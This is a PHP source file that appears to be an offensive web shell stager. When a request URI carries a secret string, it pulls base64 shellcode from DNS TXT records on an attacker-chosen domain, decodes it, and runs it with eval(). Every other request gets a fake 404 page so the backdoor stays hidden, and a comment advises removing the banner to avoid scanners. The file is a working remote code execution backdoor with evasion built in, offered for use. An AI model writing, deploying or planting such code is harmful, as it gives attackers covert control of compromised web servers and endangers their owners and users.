<?php
// Define the specific URI that triggers the fetch and execution
$secret_uri_argument = 'secret-string';
$current_uri = $_SERVER['REQUEST_URI'];


// stager domain info 
$domain = "DOMAIN_VALUE";
$hosts = ['a', 'b', 'c','d','e','f','g','h','i','j','k','l','m','n']; // Specify the hosts you want to retrieve TXT records from, remote.txt shellcode base64 content is stored as TXT record 


function dns_stager($domain, $hosts) {


    $concatenated_txt = ""; 

    foreach ($hosts as $host) {
        $fqdn = $host . '.' . $domain;
        $txt_records = dns_get_record($fqdn, DNS_TXT);

        if ($txt_records !== false) {
          
            foreach ($txt_records as $record) {
                if (isset($record['txt'])) {
                    $concatenated_txt .= $record['txt']; 
                }
            }
        } else {
            echo "Failed to fetch DNS TXT records for host: $fqdn\n\n";
        }
    }

    $decoded_txt = base64_decode($concatenated_txt);

    return $decoded_txt; // Return the decoded TXT values
}



 if (strpos($current_uri, $secret_uri_argument) !== false) {
  
    

// clear this banner if you wanna avoid scanners in the future :)
 echo " <pre>

   ___|   |                      |          ___|    |              |   | 
  |       __ \     _ \     __|   __|      \___ \    __ \     _ \   |   | 
  |   |   | | |   (   |  \__ \   |              |   | | |    __/   |   | 
 \____|  _| |_|  \___/   ____/  \__|      _____/   _| |_|  \___|  _|  _| 
                                                                         
</pre>
";

   // get the decode content 
   $remote_code = dns_stager($domain, $hosts);


    if ($remote_code !== false) {
       
        // Note: eval() is used here, but it should be handled with extreme caution
        
        eval('?>' . $remote_code);
    } else {
        echo 'Failed to fetch the remote code.';
    }
} else {
    // Display 404 page design and mimik the header :)
    header("HTTP/1.1 404 Not Found");

   // you can change the 404 design below
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>404 Not Found</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                margin-top: 50px;
            }
            h1 {
                font-size: 48px;
                color: #333;
            }
            p {
                font-size: 24px;
                color: #777;
            }
        </style>
    </head>
    <body>
        <h1>404 Not Found</h1>
        <p>The page you are looking for does not exist.</p>
    </body>
    </html>
    <?php
}
?>
